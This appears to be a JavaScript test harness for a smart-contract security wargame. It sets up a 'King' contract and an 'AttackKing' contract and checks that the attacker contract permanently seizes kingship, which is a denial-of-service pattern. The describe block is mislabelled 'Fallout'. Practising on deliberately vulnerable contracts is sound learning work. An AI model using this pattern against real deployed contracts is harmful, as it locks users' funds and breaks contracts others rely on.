const { ether, expectRevert, expectEvent, } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');

const King = contract.fromArtifact('King');
const AttackKing = contract.fromArtifact('AttackKing');

const { expect } = require('chai');
const balance = require('@openzeppelin/test-helpers/src/balance');
const send = require('@openzeppelin/test-helpers/src/send');

describe('[Challenge] Fallout', function () {

  const [deployer, attacker, someUser, ...otherAccounts] = accounts;
  const INIT_PRIZE = ether('1');

  before(async function () {
    /** SETUP SCENARIO */
    this.king = await King.new({ from: deployer, value: INIT_PRIZE });
    this.attackKing = await AttackKing.new(this.king.address, { from: attacker });
  });

  it('Exploit', async function () {
    /** YOUR EXPLOIT GOES HERE */
    let prize = await this.king.prize();
    await this.attackKing.attack({ from: attacker, value: prize });

  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    let prize = await this.king.prize();
    await expectRevert(
      send.ether(deployer, this.king.address, prize),
      'I am King!',
    );
    expect(await this.king._king()).eq(this.attackKing.address);
  });
});
